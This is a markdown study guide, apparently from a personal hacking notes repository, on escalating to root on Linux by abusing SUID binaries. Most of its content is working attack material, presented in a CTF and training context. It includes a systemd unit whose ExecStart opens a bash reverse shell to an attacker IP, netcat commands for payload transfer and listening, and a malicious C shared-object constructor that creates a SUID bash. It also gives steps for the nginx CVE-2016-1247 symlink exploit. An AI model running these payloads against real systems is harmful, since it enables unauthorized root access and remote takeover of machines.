# Linux Privilege Escalation: Exploiting SUID Binaries
> Find SUID, SGID, and Sticky Bits set. Enumerate what you have. Then research (Google) it. Dig around, find out what you can do with what you have.

## Resources: 
- [GTFOBins, SUID](https://gtfobins.github.io/#+suid)

## Contents
- [Intro](#intro)
  - [What are SUID Binaries?](#what-are-suid-binaries)
  - [Anatomy of Linux Permissions](#anatomy-of-linux-permissions)
  - [Exploiting SUID Binaries](#exploiting-suid-binaries)
- [Find SUID Files](#find-suid-files)
- [Techniques & Tools](#techniques--tools)
  - [Scenario](#scenario)
  - [Initial Info Gathering](#initial-info-gathering)
  - [The Hack](#the-hack)
- [SUID - systemctl](#suid---systemctl)
- [SUID - Shared-Object Injection](#suid---shared-object-injection)
- [SUID - Binary SymLinks](#suid---binary-symlinks)
- [SUID - ENV Variables](#suid---env-variables)

## Intro

### What are SUID Binaries?
- In addition to the three main file access permissions (read, write, execute), Linux also provides users with specialized permissions that can be utilized in specific situations. One of these access permissions is the SUID (Set User ID) permission.
- When applied, this permission provides users with the ability to execute a script or binary with the permissions of the file owner as opposed to the user that is running the script or binary.
- SUID perms are typically used to provide unprivileged users with the ability to run specific scripts or binaries with "root" perms.
  - It should be noted, however, that the provision of elevated privileges is limited to the execution of the script and does not translate to elevation of privileges.
  - However, If improperly configured, unprivileged users can exploit misconfigurations or vulnerabilities within the binary or script to obtain an elevated session. 

### Anatomy of Linux Permissions
&nbsp;&nbsp;&nbsp;![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/6dca53ac-3e7d-48a0-afef-ae8feb557ae6) ![suid](https://github.com/GregKedrovsky/Hacking/assets/26492233/b255227b-0ac8-405e-8d48-08c906f3edca)

- `SUID` - If SUID bit is set on a file and a user executed it, the process will have the same rights as the owner of the file being executed.
- `GUID` - Same as SUID but with group ownership: the process will have the same group rights of the file being executed.
- `Sticky Bit` - If the directory has the sticky bit set, a file can be deleted only by the file owner, the directory owner, or by a privileged user. The sticky bit prevents a user from deleting other users' files from public directories such as /tmp:

### Exploiting SUID Binaries
- This is the functionality that we will be attempting to exploit in order to elevate our privileges.
- However, the success of the attack will depend on the following factors:
  - Owner of the SUID Binary: Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the "root" user or other privileged users.
  - Access Permissions: We will require executable permissions in order to execute the SUID binary.

----
## Find SUID Files

Resources: My [find page](../../../find.md#find-by-perms) (in this repo)

```
find / -perm /4000  # find SUID files (ANY with SUID set)
find / -perm /2000  # find SGID files (ANY with SGID set)
find / -perm /6000  # find (ANY file with ) both SUID and SGID files

# Example Implementations:
find / -perm -u=s -type f 2>/dev/null        # find files with AT LEAST the SUID set
find / -perm -04000 -type f -ls 2>/dev/null  # find files with AT LEAST the SUID set
```

From the `find` [man page](), perm searches: 
```
-perm mode
 # Finds files with the EXACT match of the perm specified
 # '-perm g=w' or '-perm 0020' would find files that ONLY have the group write permission on and no others.

-perm -mode
 # Finds files with ALL of the perms specified.
 # '-perm -664' would find files that have AT LEAST ALL those perms (e.g., 0777 would be found).
 # '-perm -220' would find files writable by BOTH owner and group.

-perm /mode
 # Finds files with ANY of the perms specified.
 # '-perm /222' would find files writable by somebody (owner, group, AND/OR other).
 # '-perm /220' would find files writable by EITHER owner or group or BOTH.
```

----
## Techniques & Tools
> Although the following is VERY simplistic, it illustrates the concept and process.

### Scenario
- You have access to the target machine as "user1" (an unprivileged user).
  - Simple Enum: `whoami`, `groups user1`
- Within user1's home dir there are three files, one of which is `welcome`
  - This file is owned by root and is executable by user, group, and world; it also has the suid bit set.
  - So we have a file that when executed is executed with root privileges.
 
### Initial Info Gathering
- Use the file command to find out some information about the binary `welcome`
```
pwd
# /home/user1
file welcome
```
- There's nothing of note in that. Sometimes you can use unloaded binaries (like the so.2 file) and provide a malicious file for the program to load instead. But, here... not much. Moving on.
- Use the strings command to print any readable characters in the file.
```
strings welcome
```
- At the top you can see the binary loads a shared object (an .so file)
- A few lines down, you can see that "greetings" is listed. That is apparently the greeetings file in the same subdir.  Since it's an suid binary, `welcome` will execute `greetings` with root perms.

### The Hack
```
rm greetings
cp /bin/bash greetings   # copies bash shell to the current directory and names it greetings
```
- Now, when `welcome` is run and it calls `greetings`, you get a bash shell with root privileges.

## SUID - systemctl
> If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.

### 1. Payload
- Prepare your payload file `root.service`:
```
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/[attack_ip]/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

### 2. Writeable Directory
- Find a writeable directory on the target machine
```
find / -type f -maxdepth 2 -writable
```
or
```
find / -type d -maxdepth 2 -writable
```

### 3. Transfer the Payload
- Transfer the payload from your attack machine to the target machine (or just write file there using vi or vim if you have access to it)

Start up a listener on the target machine, redirecting the output to your file name: 
```
nc -vl 44444 > root.service
```

Send the file from attack machine to target:
```
nc -n [target_ip] 44444 < root.service
```

### 4. Reverse Shell Listener
- Start your listener on port 9999 on your attack machine
```
nc -lvnp 9999
```

### 5. Execute Payload
- Execute the payload on the target machine (assume the file is under /tmp/)
```
/bin/systemctl enable /tmp/root.service
```

You should see output similar to the following: 
```
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /dev/shm/root.service
Created symlink from /etc/systemd/system/root.service -> /dev/shm/root.service
```

Start it up on the target machine (and watch your listener on your attack machine): 
```
/bin/systemctl start root
```

### 6. Reverse Shell
- The nc listening on 9999 should give you root.

### [GTFOBins, systemctl](https://gtfobins.github.io/gtfobins/systemctl/) Explanation
- This does not work the same as the above.
- This allows you to run `/bin/sh` as root and store the output of the command (`c`) in the output file.
- Replace the following echo content with the content of the root.service file above and it should do the same thing.
- If the local systmctl does not work for you (if you get an error that says something like "Interactive authentication required"), then just use the one you found (probably /bin/systemclt). 
```
sudo install -m =xs $(which systemctl) .
# The which command finds the path to the systmctl accessible to us (the SUID)
# The $() is used for command substitution. It allows you to execute a command and substitute its output in place of the $() expression.
# The install command copies files and sets attributes
# Therefore: this command installs a local copy of systemctl and sets the mode (-m) to "xs" (execute, suid)

TF=$(mktemp).service                      # create a variable (mktemp = create temporary file or directory)
echo '[Service]                           # echo the following lines into that variable
Type=oneshot                              # ...basically creates a text file with this text in it
ExecStart=/bin/sh -c "id > /tmp/output"   # THIS IS THE COMMAND YOU ARE RUNNING WITH ROOT PRIVILEGES
[Install]                                 # ...change it according to your needs, wants, and desires
WantedBy=multi-user.target' > $TF         # output the previous text into our variable
./systemctl link $TF                      # link the file b/c it is not in the normal search path
./systemctl enable --now $TF              # enable the new service we configured and start it --now
```

### Resources:
- [GTFOBins, systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
- [Privilege Escalation](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740) by Alvin Smith
- [TryHackMe: Vulversity](https://tryhackme.com/r/room/vulnversity)

## SUID - Shared-Object Injection
> If you find a shared-object file that has the SUID bit set and that is writable to you, hunt around and research (Google) to find out how you might exploit that. The following is an example.

### 1. Initial Search

Find files on the compromised target that have the SUID bit set: 
```
find / -perm -u=s -type f 2>/dev/null
 # or:
find / -perm -04000 -type f -ls 2>/dev/null
```

### 2. Examine the Results

Go through the results of what `find` found.
- Remember: [GTFObins]() is your first go-to.
  - Check all the `find` results against what they have and see if there is something you can exploit to escalate your privileges.
  - If not...
- If you have a shared-object (*.so) file that is ***writable*** for your compromised user, you might be able to use it.
  - Automated tools like LinPEAS will find these things, also.
 
### 3. Find Out What that SO File Does

#### Run it: 
- You should be able to just type it in on the command line and run it.
- Example: `/usr/local/bin/suid-so`
- If it spits out output, check it out. What is it doing? What is it calling?

#### Tool: [strace](https://man7.org/linux/man-pages/man1/strace.1.html)
- `strace` is a powerful tool for monitoring and diagnosing processes in Linux.
  - It is primarily used for debugging programs, troubleshooting issues, intercepting and recording system calls, and tracing running processes.
  - It provides valuable insights into how a program interacts with the system, ***especially when the source code is not available***.

#### Example strace syntax:
```
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
 # Important:  2>&1  You MUST send your stderr to stdout or else you will not see the error messages that have valuable info.
 # grep -i = ignore case (caps and not)
 # grep -E = extended regex patterns
```

#### Objective:
- Find out if this SUID file is running (calling) any other files that you can modify. 
- If it is, then we can modify the called file and run it with the SUID shared-object file (effectively running our modified code as root).
- If you find such a file writable to you (e.g., a file named /home/user/library.so) ...

#### Create Malicious C Code
- Using your favorite editor, create a file using the same name as the file called by the SUID SO, for example, `library.c` (because we can to compile a /home/user/library.so file).
- Add the following code: 
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod  +s /tmp/bash && /tmp/bash -p");
}
```
- This makes a copy of /bin/bash in /tmp/ and adds the SUID bit to it.
- Remember, this code will be run by the SUID shared-object file, so it will have root perms.
- Compile it:
```
gcc -shared -fPIC -o /home/user/library.so evildoer.c
```

### 4. Run the SO File Again
- If you run the SUID shared object file again, it will call that /home/user/library.so file
- We modified that file to open a bash session SUID.
- Therefore, we should have root.

## SUID - Binary SymLinks

The following example illustrates how you can abuse symlinks. This example is with Nginx and it requires two specific vulnerabilities on your target machine (assumption: you have user-level access). 
1. A vulnerable version of Nginx.
2. SUID on sudo. 

### What is Nginx?

NGINX is an open-source web server software that's used for: 
- **Reverse proxying:** Distributes traffic to different applications or the same application running differently 
- **Load balancing:** Manages multiple connections without additional threads or processes 
- **Caching:** Improves performance 
- **Media streaming:** Supports sending responses in chunks instead of the entire file at once 
- **Email proxying:** Functions as a proxy server for email communications protocols, such as IMAP, POP3, and SMTP 

NGINX is designed for maximum performance and stability. It's highly suitable for high-traffic websites and applications that require fast and responsive performance.

### Scenario

Often when you compromise a machine through the web site or web server, you end up as the `www-data` user.
- If you do, and the above two conditions exist, then you may be able to exploit the vulnerability and escalate your privilege to root. 

### The Vulnerability

#### Automated Tools
Run `linux-exploit-suggester` (and/or other similar automated tools). 
- You are looking for an exploit involving [CVE-2016-1247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1247).
- The nginx package before 1.6.2-5+deb8u3 on Debian jessie, the nginx packages before 1.4.6-1ubuntu3.6 on Ubuntu 14.04 LTS, before 1.10.0-0ubuntu0.16.04.3 on Ubuntu 16.04 LTS, and before 1.10.1-0ubuntu1.1 on Ubuntu 16.10, and the nginx ebuild before 1.10.2-r3 on Gentoo ***allow local users with access to the web server user account to gain root privileges via a symlink attack on the error log***.

#### Manual
You could find this manually: 
- Check the distro first: `uname -a` or `cat /etc/issue` or `cat /etc/*release`
- Check the Nginx version: `dpkg -l | grep nginx`  

#### Find SUIDs
> Remember: for this exploit you must have SUID on sudo.
```
find / -type f -perm -04000 -ls 2>/dev/null
```

### Nginx Log Files

- This vulnerability exists because of the RWX perms on the log file directory: 

![image](https://github.com/user-attachments/assets/c0a4244d-101e-4599-9d97-acd08b1a74b5)

- We want to exploit a vulnerability that exists with the error.log file that runs/writes as root: 

![image](https://github.com/user-attachments/assets/f2e6e5bf-2048-4e2e-9e2f-9bdf9bf19f80)

### [The Exploit](https://www.exploit-db.com/exploits/40768)
- Download the script to your compromised target machine.
- Run the script against the nginx error.log file:   ./nginxed-root.sh path/to/nginx/error.log  
- This creates a symlink at /var/log/nginx/error.log -> /etc/ld.so.preload 
- Nginx must be restarted to trigger the exploit file. When it does, you should get a root prompt: 

![image](https://github.com/user-attachments/assets/d75a5df9-8ca2-4490-935e-59a196f01549)

## SUID - ENV Variables

